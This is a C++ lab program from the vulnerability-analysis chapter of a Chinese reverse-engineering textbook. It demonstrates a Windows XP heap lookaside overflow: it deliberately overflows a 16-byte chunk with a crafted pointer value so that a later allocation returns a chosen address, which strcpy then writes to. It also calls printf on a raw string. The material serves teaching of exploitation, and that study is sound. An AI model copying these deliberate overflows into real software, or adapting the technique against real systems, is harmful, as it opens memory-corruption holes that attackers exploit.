/*-----------------------------------------------------------------------
第14章  漏洞分析技术
《加密与解密（第四版）》
(c)  看雪学院 www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

// heap.cpp : Defines the entry point for the console application.
//实验环境：
//windows xp sp3 + VC6.0 
//编译选项：Debug（默认配置）


#include "stdafx.h"

#include <stdio.h>
#include <windows.h>
 
int main(int argc,char *argv[])
{
        char str[]="\nHello123456789213456789\n";
		
		
        char *a,*b,*c;
        long *hHeap;

        hHeap = (long *)HeapCreate(0x00040000,0,0);
        printf("\n(+) Creating a heap at: 0x00%xh\n",hHeap);
        printf("(+) Allocating chunk A\n");
		
        a = (char *)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
        printf("(+) Allocating chunk B\n");
		
        b = (char *)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
		
        printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n",a,b);
        printf("(+) Freeing chunk B to the lookaside\n");
		
        HeapFree(hHeap,0,b);
		
        printf("(+) Now overflow chunk A:\n");
		
        printf("%x\n",str);
        printf(str);
        memcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x64\xff\x12\x00",28);
		
        // set software bp
        //__asm__("int $0x3");
		
        printf("(+) Allocating chunk B\n");
		

        b = (char *)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
        printf("(+) Allocating chunk C\n");
		

        c = (char *)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
		
        printf("(+) Chunk A=0x00%x\n(+)Chunk B=0x00%x\n(+) Chunk C=0x00%x\n",a,b,c);
		
        strcpy(c,"AAAAAAAAAAAA\n");
        printf(str);
        // set software bp
        //_asm int 0x3;
		
        return 0;
}
